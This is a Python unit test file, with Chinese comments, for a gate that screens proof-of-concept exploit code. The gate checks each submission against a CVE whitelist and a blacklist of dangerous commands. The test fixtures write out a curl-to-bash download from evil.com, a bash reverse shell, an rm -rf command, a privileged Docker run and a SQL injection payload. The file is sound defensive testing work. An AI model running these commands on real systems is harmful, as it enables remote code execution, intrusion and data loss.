"""
test_poc_gate.py - poc_gate.py 单元测试（TC-SCA-023 G1）

覆盖场景：
  - CVE 白名单通过
  - CVE 白名单拒绝（未知 CVE）
  - 危险命令黑名单拦截（多种模式）
  - 正常 PoC 代码通过
"""

import sys
import os

# 将 scripts 目录加入 sys.path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../../scripts"))

from poc_gate import gate_check, GateDecision, CVE_WHITELIST


# ---------------------------------------------------------------------------
# 测试辅助
# ---------------------------------------------------------------------------

def assert_eq(actual, expected, msg=""):
    if actual != expected:
        raise AssertionError(f"FAIL: {msg}\n  expected: {expected!r}\n  actual:   {actual!r}")
    print(f"  PASS: {msg}")


# ---------------------------------------------------------------------------
# 测试用例
# ---------------------------------------------------------------------------

def test_whitelist_allow():
    """白名单中的 CVE，无危险命令 → ALLOW 或 WARN（Docker 不可用时降级）"""
    poc = """
import requests
# CVE-2024-22120 Zabbix 时间盲注测试
payload = "1' AND SLEEP(5)-- -"
print(f"[+] 测试 payload: {payload}")
"""
    result = gate_check("CVE-2024-22120", poc, require_sandbox=False)
    assert result.is_allowed(), f"白名单 CVE + 安全代码 → 应允许执行（ALLOW 或 WARN），实际: {result.decision}"
    print(f"  PASS: 白名单 CVE + 安全代码 → {result.decision.value}（允许执行）")


def test_whitelist_allow_case_insensitive():
    """CVE ID 大小写不敏感"""
    poc = "print('test')"
    result = gate_check("cve-2024-22120", poc, require_sandbox=False)
    assert result.is_allowed(), f"CVE ID 小写 → 应允许执行，实际: {result.decision}"
    print(f"  PASS: CVE ID 小写 → {result.decision.value}（大小写不敏感）")


def test_unknown_cve_blocked():
    """不在白名单中的 CVE → BLOCKED"""
    poc = "print('test')"
    result = gate_check("CVE-9999-99999", poc, require_sandbox=False)
    assert_eq(result.decision, GateDecision.BLOCKED, "未知 CVE → BLOCKED")
    assert "白名单" in result.reason, "原因应包含'白名单'"
    print(f"  reason: {result.reason}")


def test_blacklist_rm_rf():
    """危险命令 rm -rf / → BLOCKED"""
    poc = """
import os
os.system("rm -rf /tmp/test")
"""
    result = gate_check("CVE-2024-22120", poc, require_sandbox=False)
    assert_eq(result.decision, GateDecision.BLOCKED, "rm -rf / → BLOCKED")
    assert len(result.matched_patterns) > 0, "应有命中的黑名单模式"
    print(f"  matched: {result.matched_patterns}")


def test_blacklist_curl_pipe_bash():
    """危险命令 curl | bash → BLOCKED"""
    poc = """
import subprocess
subprocess.run("curl http://evil.com/shell.sh | bash", shell=True)
"""
    result = gate_check("CVE-2024-22120", poc, require_sandbox=False)
    assert_eq(result.decision, GateDecision.BLOCKED, "curl | bash → BLOCKED")


def test_blacklist_reverse_shell():
    """反弹 shell → BLOCKED"""
    poc = 'import os; os.system("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")'
    result = gate_check("CVE-2024-22120", poc, require_sandbox=False)
    assert_eq(result.decision, GateDecision.BLOCKED, "bash 反弹 shell → BLOCKED")


def test_blacklist_privileged_docker():
    """特权容器 → BLOCKED"""
    poc = 'import subprocess; subprocess.run("docker run --privileged ubuntu bash", shell=True)'
    result = gate_check("CVE-2024-22120", poc, require_sandbox=False)
    assert_eq(result.decision, GateDecision.BLOCKED, "docker --privileged → BLOCKED")


def test_safe_poc_allow():
    """安全的 SQL 注入测试代码 → ALLOW 或 WARN"""
    poc = """
import time

def time_blind_inject(payload):
    # 模拟 Zabbix API 时间盲注
    start = time.time()
    # 实际测试中会发送 HTTP 请求
    elapsed = time.time() - start
    return elapsed > 5

payload = "1' AND SLEEP(5)-- -"
print(f"[+] CVE-2024-22120 PoC: {payload}")
print("[+] 测试完成")
"""
    result = gate_check("CVE-2024-22120", poc, require_sandbox=False)
    assert result.is_allowed(), f"安全 SQL 注入测试代码 → 应允许执行，实际: {result.decision}"
    print(f"  PASS: 安全 SQL 注入测试代码 → {result.decision.value}（允许执行）")


def test_whitelist_contents():
    """白名单应包含核心 CVE"""
    required_cves = [
        "CVE-2024-22120",
        "CVE-2024-25641",
        "CVE-2024-34716",
    ]
    for cve in required_cves:
        assert cve in CVE_WHITELIST, f"白名单应包含 {cve}"
    print(f"  PASS: 白名单包含 {len(CVE_WHITELIST)} 个 CVE")


def test_gate_result_is_allowed():
    """GateResult.is_allowed() 方法正确"""
    poc = "print('test')"
    result = gate_check("CVE-2024-22120", poc, require_sandbox=False)
    assert result.is_allowed(), "ALLOW 决策 is_allowed() 应为 True"
    print("  PASS: is_allowed() 方法正确")


def test_gate_result_to_dict():
    """GateResult.to_dict() 包含必要字段"""
    poc = "print('test')"
    result = gate_check("CVE-2024-22120", poc, require_sandbox=False)
    d = result.to_dict()
    required_keys = ["decision", "cve_id", "reason", "matched_patterns", "sandbox_available"]
    for key in required_keys:
        assert key in d, f"to_dict() 应包含字段 {key}"
    print(f"  PASS: to_dict() 包含所有必要字段: {list(d.keys())}")


# ---------------------------------------------------------------------------
# 运行所有测试
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    tests = [
        test_whitelist_allow,
        test_whitelist_allow_case_insensitive,
        test_unknown_cve_blocked,
        test_blacklist_rm_rf,
        test_blacklist_curl_pipe_bash,
        test_blacklist_reverse_shell,
        test_blacklist_privileged_docker,
        test_safe_poc_allow,
        test_whitelist_contents,
        test_gate_result_is_allowed,
        test_gate_result_to_dict,
    ]

    passed = 0
    failed = 0

    print("=" * 60)
    print("TC-SCA-023 G1: poc_gate.py 单元测试")
    print("=" * 60)

    for test_fn in tests:
        print(f"\n[TEST] {test_fn.__name__}")
        try:
            test_fn()
            passed += 1
        except AssertionError as e:
            print(f"  FAIL: {e}")
            failed += 1
        except Exception as e:
            print(f"  ERROR: {e}")
            failed += 1

    print("\n" + "=" * 60)
    print(f"结果：{passed} 通过，{failed} 失败（共 {len(tests)} 个测试）")
    print("=" * 60)

    if failed > 0:
        sys.exit(1)
    else:
        print("✅ 所有测试通过（G1 PASS）")
        sys.exit(0)
